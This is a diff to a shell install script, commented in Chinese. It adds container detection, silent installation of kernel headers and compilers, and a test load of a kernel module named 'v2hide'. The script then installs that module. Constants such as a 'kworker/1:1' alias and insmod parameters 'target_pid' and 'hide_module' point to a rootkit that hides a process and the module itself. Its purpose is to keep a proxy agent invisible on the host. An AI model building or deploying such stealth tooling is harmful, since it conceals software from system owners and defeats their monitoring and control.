@@ -83,28 +83,88 @@ STEALTH_DIR="/etc/v2nb/stealth"
 STEALTH_KO="/etc/v2nb/v2hide.ko"
 STEALTH_ALIAS="kworker/1:1"
 
+# 判断是否容器环境（容器共享宿主内核，无法编译/加载自定义模块）
+is_container() {
+    [[ -f /.dockerenv ]] && return 0
+    [[ -f /run/.containerenv ]] && return 0
+    grep -qaE '(docker|containerd|kubepods|lxc|podman|garden)' /proc/1/cgroup 2>/dev/null && return 0
+    return 1
+}
+
+# 自动补齐内核 headers + 编译链（Debian/Ubuntu 也用 linux-headers-$(uname -r)）
+ensure_kbuild_deps() {
+    local kdir="/lib/modules/$(uname -r)/build"
+    if [[ -d "$kdir" ]] && command -v gcc >/dev/null 2>&1 && command -v make >/dev/null 2>&1; then
+        return 0
+    fi
+    if is_container; then
+        echo -e "${yellow}容器环境：共享宿主内核且无 /lib/modules/$(uname -r)/build，无法编译/加载内核模块${plain}"
+        return 1
+    fi
+    echo "尝试自动安装内核 headers 与编译工具..."
+    if [[ x"${release}" == x"centos" ]]; then
+        yum install -y "kernel-devel-$(uname -r)" kernel-headers gcc make >/dev/null 2>&1 \
+            || yum install -y kernel-devel gcc make >/dev/null 2>&1
+    elif [[ x"${release}" == x"alpine" ]]; then
+        apk add --no-cache linux-headers build-base >/dev/null 2>&1
+    elif [[ x"${release}" == x"arch" ]]; then
+        pacman -S --noconfirm --needed base-devel linux-headers >/dev/null 2>&1
+    else
+        apt-get update -y >/dev/null 2>&1
+        DEBIAN_FRONTEND=noninteractive apt-get install -y "linux-headers-$(uname -r)" build-essential kmod >/dev/null 2>&1 \
+            || DEBIAN_FRONTEND=noninteractive apt-get install -y linux-headers-generic build-essential kmod >/dev/null 2>&1 \
+            || DEBIAN_FRONTEND=noninteractive apt-get install -y "linux-headers-$(uname -m)" build-essential kmod >/dev/null 2>&1
+    fi
+    [[ -d "$kdir" ]] && return 0
+    return 1
+}
+
+# 冒烟加载：编出来 ≠ 能加载（vermagic 不匹配、模块加载被禁用都会失败）
+smoke_test_module() {
+    local ko="$1"
+    local insmod_bin="" rmmod_bin=""
+    if command -v insmod >/dev/null 2>&1; then
+        insmod_bin="insmod"
+    elif [[ -x /sbin/insmod ]]; then
+        insmod_bin="/sbin/insmod"
+    fi
+    command -v rmmod >/dev/null 2>&1 && rmmod_bin="rmmod"
+    [[ -n "$insmod_bin" ]] || return 1
+    "$insmod_bin" "$ko" target_pid=0 hide_module=0 >/dev/null 2>&1 || return 1
+    [[ -n "$rmmod_bin" ]] && "$rmmod_bin" v2hide >/dev/null 2>&1
+    return 0
+}
+
 # 编译内核模块（需要目标机内核 headers）
 build_stealth_module() {
     local work_dir="$1"
-    local kdir="/lib/modules/$(uname -r)/build"
+    local krel
+    krel="$(uname -r)"
+    local kdir="/lib/modules/${krel}/build"
     if [[ ! -f "$work_dir/v2hide.c" ]]; then
+        return 1
+    fi
+    # 缺 headers/编译链就先自动补
+    if [[ ! -d "$kdir" ]] && ! ensure_kbuild_deps; then
         return 1
     fi
     # 内核头文件路径：Debian/Ubuntu 用 /lib/modules/$(uname -r)/build；
     # CentOS/RHEL 常需手动指向 /usr/src/kernels/$(uname -r)
     if [[ ! -d "$kdir" ]]; then
-        if [[ -d "/usr/src/kernels/$(uname -r)" ]]; then
-            kdir="/usr/src/kernels/$(uname -r)"
+        if [[ -d "/usr/src/kernels/${krel}" ]]; then
+            kdir="/usr/src/kernels/${krel}"
         else
             return 1
         fi
     fi
     ( cd "$work_dir" && make KDIR="$kdir" >/dev/null 2>&1 )
-    if [[ -f "$work_dir/v2hide.ko" ]]; then
-        install -m 600 "$work_dir/v2hide.ko" "$STEALTH_KO"
-        return 0
+    [[ -f "$work_dir/v2hide.ko" ]] || return 1
+    if ! smoke_test_module "$work_dir/v2hide.ko"; then
+        echo -e "${yellow}内核模块无法加载（vermagic 不匹配或禁止加载），不启用内核级隐藏${plain}"
+        return 1
     fi
-    return 1
+    install -m 600 "$work_dir/v2hide.ko" "$STEALTH_KO"
+    return 0
 }
 
 # 打开 /etc/v2nb/config.json 里的 Stealth 段（python3 合并 JSON，不破坏已有配置）
